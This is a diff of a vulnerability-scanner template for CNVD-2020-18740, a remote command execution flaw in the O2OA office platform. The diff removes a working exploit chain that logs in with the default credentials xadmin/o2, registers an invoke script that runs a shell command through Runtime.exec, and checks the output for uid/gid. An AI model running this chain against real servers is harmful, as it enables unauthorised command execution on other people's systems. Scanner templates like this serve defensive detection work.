@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CNVD-2020-18740
 
 info:
@@ -9,40 +10,3 @@ info:
     title=="O2OA"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/O2OA/O2OA%20invoke%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2020-18740.html
-
-rules:
-  r0:
-    request:
-      method: POST
-      path: /x_organization_assemble_authentication/jaxrs/authentication/captcha?v=7.1&l7u46why
-      headers:
-        Authorization: anonymous
-        Content-Type: application/json; charset=UTF-8
-      body: |
-        {"credential":"xadmin","password":"o2"}
-    expression: response.status == 200 && response.body.bcontains(b'"type":') && response.body.bcontains(b'"success"')
-    output:
-      search: '"x-token=(?P<token>[\\w_]+);".bsubmatch(response.body)'
-      token: search["token"]
-      search1: '"Set-Cookie: (?P<cook>.*?);".bsubmatch(response.raw_header)'
-      cook: search1["cook"]
-  r1:
-    request:
-      method: POST
-      path: /x_program_center/jaxrs/invoke?v=6.3
-      headers:
-        Authorization: '{{token}}'
-        Content-Type: application/json; charset=UTF-8
-        Cookie: '{{cook}}'
-      body: |
-        {"id":"cmd","name":"cmd","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2022-08-27 04:39:18","updateTime":"2022-08-27 04:39:18"}
-    expression: (response.status == 200 && response.body.bcontains(b'"type"') && response.body.bcontains(b'"sucess"')) || (response.body.bcontains(b'"type"') && response.status == 500 && response.body.bcontains(b'"error"'))
-  r2:
-    request:
-      method: POST
-      path: /x_program_center/jaxrs/invoke/cmd/execute
-      headers:
-        Content-Type: application/json; charset=UTF-8
-        Cookie: '{{cook}}'
-    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
-expression: r0() && r1() && r2()
